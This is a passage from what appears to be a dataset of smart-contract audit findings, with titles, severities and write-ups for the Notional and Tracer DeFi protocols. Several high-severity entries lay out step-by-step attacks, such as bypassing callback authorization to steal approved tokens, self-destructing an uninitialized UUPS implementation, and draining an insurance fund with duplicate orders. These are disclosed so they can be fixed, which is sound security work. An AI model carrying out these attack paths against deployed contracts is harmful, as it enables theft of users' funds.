Recommend updating the vulnerable contract to `TimelockController v3.4.2` as it currently uses `OpenZeppelin/openzeppelin-contracts@3.4.0-solc-0.7`"
23.md,`CompoundToNotionalV2.notionalCallback` ERC20 return values not checked,high,"Some tokens (like USDT) don't correctly implement the EIP20 standard and their `transfer`/`transferFrom` functions return `void`, instead of a success boolean. Calling these functions with the correct EIP20 function signatures will always revert. See `CompoundToNotionalV2.notionalCallback`'s `IERC20(underlyingToken).transferFrom` call.

Tokens that don't correctly implement the latest EIP20 spec, like USDT, will be unusable in the protocol as they revert the transaction because of the missing return value.
The fact that there is a `cToken` with `USDT` as the underlying this issue directly applies to the protocol.

We recommend using OpenZeppelin’s `SafeERC20` versions with the `safeTransfer` and `safeTransferFrom` functions that handle the return value check as well as non-standard-compliant tokens."
23.md,Access restrictions on `CompoundToNotionalV2.notionalCallback` can be bypassed,high,"The `CompoundToNotionalV2.notionalCallback` is supposed to only be called from the verified contract that calls this callback. But, the access restrictions can be circumvented by simply providing `sender = this`, as `sender` is a parameter of the function that can be chosen by the attacker.

```solidity
function notionalCallback(
    address sender,
    address account,
    bytes calldata callbackData
) external returns (uint256) {
// @audit sender can be passed in by the attacker
require(sender == address(this), ""Unauthorized callback"");
```

An attacker can call the function passing in an arbitrary `account` whose tokens are then transferred to the contract.
The `account` first has to approve this contract but this can happen with accounts that legitimately want to call the outer function and have to send a first transaction to approve the contract, but then an attacker front-runs the actual transaction.

It's at least a griefing attack:
I can pass in a malicious `cTokenBorrow` that returns any token of my choice (through the `.underlying()` call) but whose `repayBorrowBehalf` is a no-op.


This will lead to any of the victim's approved tokens becoming stuck in the contract, essentially burning them:

```solidity
// @audit using a malicious contract, this can be any token
address underlyingToken = CTokenInterface(cTokenBorrow).underlying();
bool success = IERC20(underlyingToken).transferFrom(account, address(this), cTokenRepayAmount);
require(success, ""Transfer of repayment failed"");

// Use the amount transferred to repay the borrow
// @audit using a malicious contract, this can be a no-op
uint code = CErc20Interface(cTokenBorrow).repayBorrowBehalf(account, cTokenRepayAmount);
```

Note that the assumption at the end of the function ""// When this exits a free collateral check will be triggered"" is not correct anymore but I couldn't find a way to make use of it to lead to an invalid account state.

Recommend fixing the authorization check."
23.md,Access restrictions on `NotionalV1ToNotionalV2.notionalCallback` can be bypassed,high,"The `NotionalV1ToNotionalV2.notionalCallback` is supposed to only be called from the verified contract that calls this callback but the access restrictions can be circumvented by simply providing `sender = this` as `sender` is a parameter of the function that can be chosen by the attacker.

```solidity
function notionalCallback(
    address sender,
    address account,
    bytes calldata callbackData
) external returns (uint256) {
    require(sender == address(this), ""Unauthorized callback"");
```

An attacker can call the function passing in an arbitrary `account` whose tokens can then be stolen.
The `account` first has to approve this contract but this can happen with accounts that legitimately want to migrate their tokens and therefore have to send a first transaction to approve the contract, but then an attacker frontruns the actual migration transaction.

The attacker can steal the tokens by performing an attack similar to the following:
- first transaction is used to withdraw the victim's funds to the contract. This can be done by choosing `account=victim`, `v1RepayAmount=0`, `v1CollateralId=WBTC`, `v2CollateralId=DAI`. The [`NotionalV1Erc1155.batchOperationWithdraw`](https://github.com/notional-finance/contracts/blob/4bf7a85e6cf81cde4283e0efab0b03f21249ba00/contracts/ERC1155Trade.sol#L108) (not part of this contest) will withdraw the victim's funds to this contract. Note that the attacker has to deposit the same `v2CollateralBalance = uint256(collateralBalance)` for the victim into the V2 version, but they can choose different cheaper collateral (for example, withdraw WBTC, deposit same amount of DAI).
- second transaction is now used to deposit the victim funds in the contract into the user's account. They use `account=attacker`, `v1DebtCurrencyId=WBTC`, `v1RepayAmount=amount` to deposit it into Notional V1. (They need to have a small `collateralBalance`, etc. to pass all checks).

Recommend fixing the authorization check."
23.md,`TokenHandler.safeTransferOut` does not work on non-standard compliant tokens like USDT,high,"The `TokenHandler.safeTransferOut` function uses the standard `IERC20` function for the transfer call and proceeds with a `checkReturnCode` function to handle non-standard compliant tokens that don't return a return value.
However, this does not work, as calling `token.transfer(account, amount)` already reverts if the token does not return a return value, as `token`'s `IERC20.transfer` is defined to always return a `boolean`.

The impact is that, when using any non-standard compliant token like USDT, the function will revert.
Deposits for these tokens are broken, which is bad as `USDT` is a valid underlying for the `cUSDT` cToken.

We recommend using [OpenZeppelin’s `SafeERC20`](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/release-v4.1/contracts/token/ERC20/utils/SafeERC20.sol#L74) versions with the `safeApprove` function that handles the return value check as well as non-standard-compliant tokens."
23.md,`TokenHandler.safeTransferIn` does not work on non-standard compliant tokens like USDT,high,"The `TokenHandler.safeTransferIn` function uses the standard `IERC20` function for the transfer call and proceeds with a `checkReturnCode` function to handle non-standard compliant tokens that don't return a return value.
However, this does not work, as calling `token.transferFrom(account, amount)` already reverts if the token does not return a return value, as `token`'s `IERC20.transferFrom` is defined to always return a `boolean`.

When using any non-standard compliant token like USDT, the function will revert.
Withdrawals for these tokens are broken, which is bad as `USDT` is a valid underlying for the `cUSDT` cToken.

We recommend using [OpenZeppelin’s `SafeERC20`](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/release-v4.1/contracts/token/ERC20/utils/SafeERC20.sol#L74) versions with the `safeApprove` function that handles the return value check as well as non-standard-compliant tokens."
23.md,DOS by Frontrunning NoteERC20 `initialize()` Function,high,"The `scripts/` folder outlines a number of deployment scripts used by the Notional team. Some of the contracts deployed utilize the ERC1967 upgradeable proxy standard. This standard involves first deploying an implementation contract and later a proxy contract which uses the implementation contract as its logic.

When users make calls to the proxy contract, the proxy contract will delegate call to the underlying implementation contract. `NoteERC20.sol` and `Router.sol` both implement an `initialize()` function which aims to replace the role of the `constructor()` when deploying proxy contracts. It is important that these proxy contracts are deployed and initialized in the same transaction to avoid any malicious front-running.

However, `scripts/deployment.py` does not follow this pattern when deploying `NoteERC20.sol`'s proxy contract. As a result, a malicious attacker could monitor the Ethereum blockchain for bytecode that matches the `NoteERC20` contract and front-run the `initialize()` transaction to gain ownership of the contract. This can be repeated as a Denial Of Service (DOS) type of attack, effectively preventing Notional's contract deployment, leading to unrecoverable gas expenses. See [`deployment.py` L44-L60](https://github.com/code-423n4/2021-08-notional/blob/main/scripts/deployment.py#L44-L60), and [`deploy_governance.py` L71-L105](https://github.com/code-423n4/2021-08-notional/blob/main/scripts/mainnet/deploy_governance.py#L71-L105).

As the `GovernanceAlpha.sol` and `NoteERC20.sol` are co-dependent contracts in terms of deployment, it won't be possible to deploy the governance contract before deploying and initializing the token contract. Therefore, it would be worthwhile to ensure the `NoteERC20.sol` proxy contract is deployed and initialized in the same transaction, or ensure the `initialize()` function is callable only by the deployer of the `NoteERC20.sol` contract. This could be set in the proxy contracts `constructor()`."
23.md,Potential DOS in Contracts Inheriting `UUPSUpgradeable.sol`,high,"There are a number of contracts which inherit `UUPSUpgradeable.sol`, namely; `GovernanceAction.sol`, `PauseRouter.sol` and `NoteERC20.sol`.

All these contracts are deployed using a proxy pattern whereby the implementation contract is used by the proxy contract for all its logic. The proxy contract will make delegate calls to the implementation contract. This helps to facilitate future upgrades by pointing the proxy contract to a new and upgraded implementation contract.

However, if the implementation contract is left uninitialized, it is possible for any user to gain ownership of the `onlyOwner` role in the implementation contract for `NoteERC20.sol`. Once the user has ownership they are able to perform an upgrade of the implementation contract's logic contract and delegate call into any arbitrary contract, allowing them to self-destruct the proxy's implementation contract. Consequently, this will prevent all `NoteERC20.sol` interactions until a new implementation contract is deployed.

Initial information about this issue was found [here](https://forum.openzeppelin.com/t/security-advisory-initialize-uups-implementation-contracts/15301).

Consider the following scenario:
- Notional finance deploys their contracts using their deployment scripts. These deployment scripts leave the implementation contracts uninitialized. Specifically the contract in question is `NoteERC20.sol`.
- This allows any arbitrary user to call `initialize()` on the `NoteERC20.sol` implementation contract.
- Once a user has gained control over `NoteERC20.sol`'s implementation contract, they can bypass the `_authorizeUpgrade` check used to restrict upgrades to the `onlyOwner` role.
- The malicious user then calls `UUPSUpgradeable.upgradeToAndCall()` shown [here](https://github.com/code-423n4/2021-08-notional/blob/main/contracts/proxy/utils/UUPSUpgradeable.sol#L40-L43) which in turn calls [this](https://github.com/code-423n4/2021-08-notional/blob/main/contracts/proxy/ERC1967/ERC1967Upgrade.sol#L77-L107) function. The new implementation contract then points to their own contract containing a self-destruct call in its fallback function.
- As a result, the implementation contract will be self-destructed due to the user-controlled delegate call shown [here](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/v3.4.0-solc-0.7/contracts/utils/Address.sol#L163-L169), preventing all future calls to the `NoteERC20.sol` proxy contract until a new implementation contract has been deployed.

Recommend considering initializing the implementation contract for `NoteERC20.sol` and checking the correct permissions before deploying the proxy contract or performing any contract upgrades. This will help to ensure the implementation contract cannot be self-destructed."
23.md,Liquidity token value can be manipulated,high,"The liquidity token value (`AssetHandler.getLiquidityTokenValue`) is the sum of the value of the individual claims on cash (underlying or rather cTokens) and fCash.
The amount to redeem on each of these is computed as the LP token to redeem relative to the total LP tokens, see `AssetHandler.getCashClaims` / `AssetHandler.getHaircutCashClaims`:

```solidity
// @audit token.notional are the LP tokens to redeem
assetCash = market.totalAssetCash.mul(token.notional).div(market.totalLiquidity);
fCash = market.totalfCash.mul(token.notional).div(market.totalLiquidity);
```

This means the value depends on the **current market reserves** which can be manipulated.
You're essentially computing a spot price (even though the individual values use a TWAP price) because you use the current market reserves which can be manipulated.

See the ""How do I tell if I’m using spot price?"" section [here](https://shouldiusespotpriceasmyoracle.com/).
> However, by doing this you’re actually incorporating the spot price because you’re still dependent on the reserve balances of the pool. This is an extremely subtle detail, and more than one project has been caught by it. You can read more about this [footgun](https://cmichel.io/pricing-lp-tokens/) in this writeup by @cmichelio.

The value of an LP token is computed as `assetCashClaim + assetRate.convertFromUnderlying( presentValue(fCashClaim) )`, where `(assetCashClaim, fCashClaim)` depends on the current market reserves which can be manipulated by an attacker via flashloans.
Therefore, an attacker trading large amounts in the market can either increase or decrease the value of an LP token.

If the value decreases, they can try to liquidate users borrowing against their LP tokens / nTokens.
If the value increases, they can borrow against it and potentially receive an under-collateralized borrow this way, making a profit.

The exact profitability of such an attack depends on the AMM as the initial reserve manipulation and restoring the reserves later incurs fees and slippage.
In constant-product AMMs like Uniswap it's profitable and several projects have already been exploited by this, like [warp.finance](https://cmichel.io/pricing-lp-tokens/).
However, Notional Finance uses a more complicated AMM and the contest was too short for me to do a more thorough analysis. It seems like a similar attack could be possible here as described by the developers when talking about a different context of using TWAP oracles:
> ""Oracle rate protects against short term price manipulation. Time window will be set to a value on the order of minutes to hours. This is to protect fCash valuations from market manipulation. For example, a trader could use a flash loan to dump a large amount of cash into the market and depress interest rates. Since we value fCash in portfolios based on these rates, portfolio values will decrease and they may then be liquidated."" - Market.sol L424

Recommend not using the current market reserves to determine the value of LP tokens. Also, think about how to implement a TWAP oracle for the LP tokens themselves, instead of combining it from the two TWAPs of the claimables."
23.md,"TokenHandler.sol, L174 - `.transfer` is bad practice",medium,"The use of `.transfer` in [`TokenHandler.sol` L174](https://github.com/code-423n4/2021-08-notional/blob/4b51b0de2b448e4d36809781c097c7bc373312e9/contracts/internal/balances/TokenHandler.sol#L174) to send ether is now considered bad practice as gas costs can change which would break the code.

See [stop using soliditys transfer now](https://consensys.net/diligence/blog/2019/09/stop-using-soliditys-transfer-now/), and [istanbul hardfork eips increasing gas costs and more](https://chainsecurity.com/istanbul-hardfork-eips-increasing-gas-costs-and-more/).

Recommend using `call` instead, and make sure to check for reentrancy.



_**EDITORS NOTE:** Additional conversation regarding this vulnerability can be found [here](https://github.com/code-423n4/2021-08-notional-findings/issues/38)_"
23.md,`.latestRoundData()` does not update the oracle - `ExchangeRate.sol`,medium,"delamo, also found by tensors, JMukesh, cmichel and defsec_

The method `.latestRoundData()` on an oracle returns the latest updated price from the oracle, but this is not the current price of an asset. To get an accurate current price you need to query it by calling the oracle and waiting for a callback to fulfill the request.

Inaccurate price data could quickly lead to a large loss of funds. Suppose the price of an asset changes downward 5% but your oracle is not updated. A user could deposit funds (credited with an extra 5% since the oracle isn't updated), wait until `.latestRoundData()` updates (or update it himself) and becomes accurate. He then withdraws to the same asset he put in for an extra 5%. [`ExchangeRate.sol` L84](https://github.com/code-423n4/2021-08-notional/blob/4b51b0de2b448e4d36809781c097c7bc373312e9/contracts/internal/valuation/ExchangeRate.sol#L84)

Recommend not fetching the latest price (having to call the oracle to update the price instead), and then waiting for the callback."
23.md,Allowance checks not correctly implemented,medium,"The `nTokenAction` implements two token approvals, the `nTokenWhitelist` which is always used first, and the `nTokenAllowance` which is checked second.
If the `nTokenWhitelist` does _not_ have enough allowance for the transfer, the transaction fails, even in the case where `nTokenAllowance` still has enough allowance.

Transfers that have sufficient allowance fail in certain cases.

Recommend that, instead of reverting if the `nTokenWhitelist` allowance is not enough, default to the `nTokenAllowance` case.

Something like this:

```solidity
uint256 requiredAllowance = amount;

uint256 allowance = nTokenWhitelist[from][spender];
// use whitelist allowance first
if (allowance > 0) {
    uint256 min = amount < allowance ? amount : allowance;
    requiredAllowance -= min;
    allowance = allowance.sub(min);
    nTokenWhitelist[from][spender] = allowance;
}

// use currency-specific allowance now
if(requiredAllowance > 0)
    // This is the specific allowance for the nToken.
    allowance = nTokenAllowance[from][spender][currencyId];
    require(allowance >= requiredAllowance, ""Insufficient allowance"");
    allowance = allowance.sub(requiredAllowance);
    nTokenAllowance[from][spender][currencyId] = allowance;
}
```"
23.md,`CompoundToNotionalV2.enableToken` ERC20 missing return value check,medium,"The `enableToken` function performs an `ERC20.approve()` call but does not check the `success` return value.
Some tokens do **not** revert if the approval failed, returning `false` instead.

The impact is that, tokens that don't actually perform the approve and return `false` are still counted as a correct approve.

Recommend using [OpenZeppelin’s `SafeERC20`](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/release-v4.1/contracts/token/ERC20/utils/SafeERC20.sol#L74) versions with the `safeApprove` function that handles the return value check as well as non-standard-compliant tokens."
23.md,`nTokenERC20Proxy` emits events even when not success,medium,"The `nTokenERC20Proxy` functions emit events all the time, even if the return value from the inner call returns `false`, indicating an unsuccessful action.

An off-chain script scanning for `Transfer` or `Approval` events can be tricked into believing that an unsuccessful transfer was indeed successful.
This happens in the `approve`, `transfer` and `transferFrom` functions.

Recommend only emitting events on `success`."
23.md,`TokenHandler.setToken` ERC20 missing return value check,medium,"The `setToken` function performs an `ERC20.approve()` call but does not check the `success` return value.
Some tokens do **not** revert if the approval failed but return `false` instead.

The impact is that tokens that don't actually perform the approve and return `false` are still counted as a correct approve.

We recommend using [OpenZeppelin’s `SafeERC20`](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/release-v4.1/contracts/token/ERC20/utils/SafeERC20.sol#L74) versions with the `safeApprove` function that handles the return value check as well as non-standard-compliant tokens."
23.md,Attackers can force liquidations by borrowing large amounts of an asset.,medium,"Consider an attacker who borrows enough to greatly increase the oracle rate. It is claimed that arbitrageurs will come in and fix this discrepancy before the attacker has a chance to profit off of his price manipulation:
> ""Over the next 1 hour, the effect of the new 12% interest rate will be averaged into the previous 6% rate.
> This forces the borrower to hold their position and gives an opportunity for other traders to lend to the market
> to bring the interest rate back down to its previous 6% level.""

In my opinion, this incentive is not sufficient to prevent an attack. This assumes that:

1) There is sufficient volume to notice a manipulation like this
2) The arbitrageurs would be willing to deploy capital for a short amount of for a slightly increased rate
3) The arbitrageurs would now know that this is a manipulation, and not a natural market movement (For example, lets say an asset lending rate goes up 10% in value, is it being manipulated or is the rate actually worth 10% more for some reason? An arbitrageur needs to make this before he deploys capital). Since notional is the only market to offer something like this, it is difficult to discern what the response should be.
4) The arbitrageurs don't join in on the attack, and try to liquidate accounts with the attacker

Proof of concept is based off of the formula and text [here](https://github.com/code-423n4/2021-08-notional/blob/main/contracts/internal/valuation/_README.md).

Uncertain what the recommendation should be."
23.md,Incorrect event parameters in `transferFrom` function,low,"Different parameter are being set in `Approval` event in `transferFrom()`

```solidity
function transferFrom(
    address from,
    address to,
    uint256 amount
) external override returns (bool) {
    (bool success, uint256 newAllowance) =
        proxy.nTokenTransferFrom(currencyId, msg.sender, from, to, amount);

    // Emit transfer events here so they come from the correct contract
    emit Transfer(from, to, amount);

// here first parameter should be owner and second should be spender
//   as mentioned in ntokenErc20.sol that is :
// event Approval(address indexed owner, // address indexed spender, uint256 amount);

    emit Approval(msg.sender, from, newAllowance);

    return success;
}
```

The impact is that, this error may negatively impact off-chain tools that are monitoring critical transfer events of the token. See [`nTokenERC20Proxy.sol` L100](https://github.com/code-423n4/2021-08-notional/blob/4b51b0de2b448e4d36809781c097c7bc373312e9/contracts/external/adapters/nTokenERC20Proxy.sol#L100)."
23.md,`Address.isContract` with no check of returned value,low,"The function `activateNotional` calls `Address.isContract(...)` but does not check the returned value, thus making this call pretty much useless:
```solidity
Address.isContract(address(notionalProxy_));
```

Recommend wrapping this in a require statement."
23.md,lack of input validation of arrays,low,"```solidity
function migrateBorrowFromCompound(
    address cTokenBorrow,
    uint256 cTokenRepayAmount,
    uint16[] memory notionalV2CollateralIds,
    uint256[] memory notionalV2CollateralAmounts,
    BalanceActionWithTrades[] calldata borrowAction
) ;
```

if the array length of `notionalV2CollateralId` , `notionalV2CollateralAmounts` and `borrowAction` is not equal, it can lead to an error. See [`CompoundToNotionalV2.sol` L24](https://github.com/code-423n4/2021-08-notional/blob/4b51b0de2b448e4d36809781c097c7bc373312e9/contracts/external/adapters/CompoundToNotionalV2.sol#L24).

Recommend checking the input array length."
23.md,No Transfer Ownership Pattern,low,"The current ownership transfer process involves the current owner calling `NoteERC20.transferOwnership()`. This function checks that the new owner is not the zero address and proceeds to write the new owner's address into the owner's state variable. If the nominated EOA account is not a valid account, it is entirely possible the owner may accidentally transfer ownership to an uncontrolled account, breaking all functions with the `onlyOwner()` modifier. See [`NoteERC20.sol` L123-L127](https://github.com/code-423n4/2021-08-notional/blob/main/contracts/external/governance/NoteERC20.sol#L123-L127).

Recommend considering implementing a two step process where the owner nominates an account and the nominated account needs to call an `acceptOwnership()` function for the transfer of ownership to fully succeed. This ensures the nominated EOA account is a valid and active account."
23.md,`initialize` functions can be front-run,low,"The `initialize` function that initializes important contract state can be called by anyone.

Occurences:
- `NoteERC20.initialize`
- `Router.initialize`

The attacker can initialize the contract before the legitimate deployer, hoping that the victim continues to use the same contract.
In the best case for the victim, they notice it and have to redeploy their contract costing gas.

Recommend using the constructor to initialize non-proxied contracts. For initializing proxy contracts, recommend deploying contracts using a factory contract that immediately calls `initialize` after deployment, or make sure to call it immediately after deployment and verify the transaction succeeded."
23.md,`ERC1155Action` returns `false` on `supportsInterface` with the real ERC1155 interface,low,"As the return value of `ERC1155.balanceOf` was changed to a signed integer, the `nERC1155Interface` does not implement the `ERC1155` interface and the `supportsInterface` call will return false if people call it with the actual `ERC1155` interface ID.

Not all users of the contract might care about the `balance` function and call `supportsInterface` with the original EIP1155 interface.
The contract will still deny the *[content missing]*

It is indeed debatable if this contract should be considered implementing ERC1155 and what the correct return value of `supportsInterface(ERC1155.interface)` should be for compatibility.
Users need to be aware that this contract is not standard compliant and that the `supportsInterface` call will fail."
23.md,ERC1155 has reentrancy possibilities.,low,"ERC1155 tokens have a callback on transfer, making reentrancy a possibility.
I haven't been able to find any reentrancy, but having extra external function calls isn't safe.
If it's necessary to use an ERC1155 there is nothing you can do about it, but otherwise consider just using an ERC20.

See [`actions/ERC1155Action` sol](https://github.com/code-423n4/2021-08-notional/blob/main/contracts/external/actions/ERC1155Action.sol).

Recommend confirming that using tokens with callbacks is really necessary for the protocol to function."
23.md,Open TODOs in `ERC1155Action`,low,"The `ERC1155Action._checkPostTransferEvent` has open TODOs:

```solidity
// TODO: retrieve revert string
require(status, ""Call failed"");
```

Open TODOs can hint at programming or architectural errors that still need to be fixed.

Recommend resolving the TODO and bubble up the error."
23.md,Router calls to `nTokenAction.nTokenTransferApprove` fail,low,"The `Router` forwards `nTokenTransferApprove` calls to the `nTokenAction` implementation. However, these always fail due to the `msg.sender == nTokenAddress` check.

This call failing seems to be the intended behavior but it shouldn't even be forwarded in the Router.

Recommend removing `sig == nTokenAction.nTokenTransferApprove.selector` from the `getRouterImplementation` as it indicates that this is a valid function call."
23.md,Unclear decimals value in `cTokenAggregator`,low,"The `cTokenAggregator.decimals` value is set to `18` but `cTokens` only have `8` decimals. It's unclear what this `decimals` field refers to.

If it should refer to the `cToken` decimals, it's wrong and should be set to `8`.
This value is not used inside the contract but it's `public` and anyone can read it."
23.md,Governor average block time is not up-to-date,low,"The `GovernorAlpha.MIN_VOTING_PERIOD_BLOCKS = 6700` value indicates an average block time of 12.8956s which was correct a year ago, but at the moment a more accurate block time would be 13.2s, see [blocktime](https://etherscan.io/chart/blocktime).

Recommend using a `MIN_VOTING_PERIOD_BLOCKS` of `6545`."
23.md,NoteERC20 missing initial ownership event,low,"The `NoteERC20.initialize` function does not emit an initial `OwnershipTransferred` event.

Recommend emitting `OwnershipTransferred(address(0), owner_)` in `initialize`."
23.md,`TokenHandler.transfer` wrong branch order,low,"The `TokenHandler.transfer` should handle the `if (token.tokenType == TokenType.Ether)` case first, as if the token type is `Ether` but `netTransferExternal <= 0` it treats the token as an `ERC20` token and tries to call `ERC20` functions on it.

Luckily, trying to call ERC20 functions on the invalid token address will revert which is the desired behavior.

We still recommend reordering the branches and adding a `netTransferExternal <= 0` check. The code becomes cleaner and it's more obvious that the transaction will fail."
23.md,`DateTime.isValidMarketMaturity` bounds should be tighter,low,"`DateTime.isValidMarketMaturity` can be called with a `maxMarketIndex < 10` but the inner `DateTime.getTradedMarket(i)` function will revert for any values `i > 7`.

The impact is that ""Valid"" `maxMarketIndex` values above 7 will break and return with an error.

Recommend that the upper bound on `maxMarketIndex` should be set to `7`."
23.md,`DateTime.getMarketIndex` bounds should be tighter,low,"`DateTime.getMarketIndex` can be called with a `maxMarketIndex < 10` but the inner `DateTime.getTradedMarket(i)` function will revert for any values `i > 7`.

""Valid"" `maxMarketIndex` values above 7 will break and return with an error.

The upper bound on `maxMarketIndex` should be set to `7`."
23.md,"Double check for ""birthday"" collision",low,"The function [`getRouterImplementation`](https://github.com/code-423n4/2021-08-notional/blob/main/contracts/external/Router.sol#L97) of `Router.sol` checks the selectors of functions and calls the appropriate function.
Selectors are only 4 bytes long, so there is a theoretical probability of a collision (e.g. two functions having the same selector).

This is comparable to the [""birthday attack""](https://en.wikipedia.org/wiki/Birthday_attack).
The probability of a collision when you have 93 different functions is 10^−6.
Due to the structure of the `Router.sol`, the solidity compiler does not prevent collisions

Recommend double checking (perhaps via a continuous integration script / github workflow), that there are no collisions of the selectors.

**- [jeffywu (Notional) confirmed](https://github.com/code-423n4/2021-08-notional-findings/issues/4)**"
23.md,`notionalCallback` returns no value,low,"The function `notionalCallback` (in `NotionalV1ToNotionalV2` and `CompoundToNotionalV2`) declares to return uint, however, no actual value is returned.

Recommend either removing the return declaration or returning the intended value (I assume it may return a value that it gets from `depositUnderlyingToken`/`depositAssetToken`). Otherwise, it may confuse other protocols that later may want to integrate with you."
23.md,`NotionalV1ToNotionalV2` should reject ETH transfers from others than WETH,low,"The contract `NotionalV1ToNotionalV2` has an empty receive function which allows it to receive Ether. I suppose this was needed to receive ETH when withdrawing from WETH. As there is no way to send out accidentally sent ETH from this contract, I suggest adding an auth check to this receive function to only accept ETH from WETH contract.

```solidity
require(msg.sender == address(WETH), ""Not WETH"");
```"
23.md,No checks on target variable,low,"Lack of checks on target could lead to loss of funds in [`Reservoir.sol` L50](https://github.com/code-423n4/2021-08-notional/blob/4b51b0de2b448e4d36809781c097c7bc373312e9/contracts/external/governance/Reservoir.sol#L50).

Recommend requiring that target is non-zero."
23.md,Some `TradingActions` do not have front-running protections,low,"Some of the actions in `TradingAction.sol` can be front-run. Since there are no slippage protections, its unclear how bad this problem can be.
See [`TradingAction.sol` L334](https://github.com/code-423n4/2021-08-notional/blob/4b51b0de2b448e4d36809781c097c7bc373312e9/contracts/external/actions/TradingAction.sol#L334).

An example is `_settleCashDebt()`. This goes through `_getfCashSettleAmount()` which uses an `impliedRate` variable. This can be manipulated by a frontrunner. Add checks that exist on the other trade types.

Recommend adding `minAmountOut`/`minAmountCredited` as function variables to protect against frontrunning. For example. `_executeLiquidityTrade` has such protections in place."
23.md,`NoteERC20.getPriorVotes` includes current unclaimed incentives,low,"The `NoteERC20.getPriorVotes` function is supposed to return the voting strength of an account at a specific block in the past.
This should be a static value but it directly includes the _current_ unclaimed incentives due to the `getUnclaimedVotes(account)` call.

Users that didn't even have tokens at the time of proposal creation (but are now interested in voting on the proposal), can farm unclaimed incentives and impact the outcome of the proposal.

Adding checkpoints for all unclaimed incentives would be the correct solution but was probably not done because it'd cost too much gas.
It also needs to be ensured that incentives cannot be increased through flash-loaning of assets."
16.md,Wrong trading pricing calculations,high,"In the `Pricing` contract, an agent can manipulate the trading prices by spamming a high amount of trades.

Indeed an agent can create a high amount of orders at an arbitrary price and with a near-zero amount (so the agent doesn't even need large funds); next he/she pairs the orders with another account and calls `Trader.executeTrade`; now every order calls a `Pricing.recordTrade` using the arbitrary price set by the agent.

Since the trades are all made in the same hour, by the way `hourlyTracerPrices[currentHour]` is calculated, it skews the average price towards the price set by the agent. This arbitrary value is used to calculate the `fundingRates` and the `fairPrice`, allowing a malicious agent the ability to manipulate the market.

Recommend passing the `fillAmount` parameter to `recordTrade(...)`, and calculate `hourlyTracerPrices[currentHour].trades` summing `fillAmount` instead of 1 every trade."
16.md,Use of incorrect index leads to incorrect updation of funding rates,high,"The `updateFundingRate()` function updates the funding rate and insurance funding rate. While the instant/new funding rates are calculated correctly, the cumulative funding rate calculation is incorrect because it is always adding the instant to 0, not the previous value. This is due to the use of `[currentFundingIndex]` which has been updated since the previous call to this function while it should really be using `[currentFundingIndex-1]` to reference the previous funding rate.

The impact of this, is that the cumulative funding rate and insurance funding rates are calculated incorrectly without considering the correct previous values. This affects the settling of accounts across the entire protocol. The protocol logic is significantly impacted, accounts will not be settled as expected, protocol shutdown and contracts will need to be redeployed. Users may lose funds and the protocol takes a reputation hit.

Recommend using `[currentFundingIndex-1]` for non-zero values of `currentFundingIndex` to get the value updated in the previous call on lines L155 and L159 of `Pricing.sol`."
16.md,Malicious owner can drain the market at any time using `SafetyWithdraw`,high,"The `withdrawERC20Token()` in `SafetyWithdraw` inherited in `TracerPerpetualSwaps` is presumably a guarded launch emergency withdrawal mechanism. However, given the trust model where the market creator/owner is potentially untrusted/malicious, this is a dangerous approach to emergency withdrawal in the context of guarded launch.

Alternatively, if this is meant for the owner to withdraw “external” ERC20 tokens mistakenly deposited to the Tracer market, then the function should exclude `tracerQuoteToken` from being the `tokenAddress` that can be used as a parameter to `withdrawERC20Token()`.

The impact of this is that, if a malicious owner of a market withdraws/rugs all `tracerQuoteToken`s deposited at any time after market launch, all users lose deposits and the protocol takes a reputational hit and has to refund the users from treasury.

Therefor, it is recommended that, for a guarded launch circuit breaker, design a pause/unpause feature where deposits are paused (in emergency situations) but withdrawals are allowed by the depositors themselves instead of the owner. Alternatively, if this is meant to be for removing external ERC20 tokens accidentally deposited to market, exclude the `tracerQuoteToken` from being given as the `tokenAddress`."
16.md,Logic error in fee subtraction,high,"In `LibBalances.applyTrade()`, we need to collect a fee from the trade. However, the current code subtracts a fee from the short position and adds it to the long. The correct implementation is to subtract a fee to both (see `TracerPerpetualSwaps.sol` L272).
This issue causes withdrawals problems, since Tracer thinks it can withdraw the collect fees, leaving the users with an incorrect amount of quote tokens.

Recommend changing `+fee` to `-fee` in the [highlighted line](https://github.com/code-423n4/2021-06-tracer/blob/main/src/contracts/lib/LibBalances.sol#L187)."
16.md,Insurance slippage reimbursement can be used to steal insurance fund,high,"The `Liquidation` contract allows the liquidator to submit ""bad"" trade orders and the insurance reimburses them from the insurance fund, see `Liquidation.claimReceipt`.
The function can be called with an `orders` array, which does not check for duplicate orders.
An attacker can abuse this to make a profit by liquidating themselves, making a small bad trade and repeatedly submitting this bad trade for slippage reimbursement.

**Example**:
- Attacker uses two accounts, one as the liquidator and one as the liquidatee.
- They run some high-leverage trades such that the liquidatee gets liquidated with the next price update. (If not cash out and make a profit this way through trading, and try again.)
- Liquidator liquidates liquidatee
- They now do two trades:
  - One ""good"" trade at the market price that fills 99% of the liquidation amount. The slippage protection should not kick in for this trade
  - One ""bad"" trade at a horrible market price that fills only 1% of the liquidation amount. This way the slippage protection kicks in for this trade
- The liquidator now calls `claimReceipt(orders)` where `orders` is an array that contains many duplicates of the ""bad"" trade, for example 100 times. The `calcUnitsSold` function will return `unitsSold = receipt.amountLiquidated` and a bad `avgPrice`. They are now reimbursed the price difference on the full liquidation amount (instead of only on 1% of it) making an overall profit

This can be repeated until the insurance fund is drained.

The attacker has an incentive to do this attack as it's profitable and the insurance fund will be completely drained.

Recommend disallowing duplicate orders in the `orders` argument of `claimReceipt`. This should make the attack at least unprofitable, but it could still be a griefing attack.
A quick way to ensure that `orders` does not contain duplicates is by having liquidators submit the orders in a sorted way (by order ID) and then checking in the `calcUnitsSold` `for` loop that the current order ID is strictly greater than the previous one."
16.md,Wrong price scale for `GasOracle`,high,"The `GasOracle` uses two chainlink oracles (GAS in ETH with some decimals, USD per ETH with some decimals) and multiplies their raw return values to get the gas price in USD.

However, the scaling depends on the underlying decimals of the two oracles and could be anything.
But the code assumes it's in 18 decimals.

> ""Returned value is USD/Gas * 10^18 for compatibility with rest of calculations""

There is a `toWad` function that seems to involve scaling but it is never used.

The impact is that, If the scale is wrong, the gas price can be heavily inflated or under-reported.

Recommend checking `chainlink.decimals()` to know the decimals of the oracle answers and scale the answers to 18 decimals such that no matter the decimals of the underlying oracles, the `latestAnswer` function always returns the answer in 18 decimals."
16.md,Use of deprecated Chainlink API,medium,"delamo, cmichel and shw_

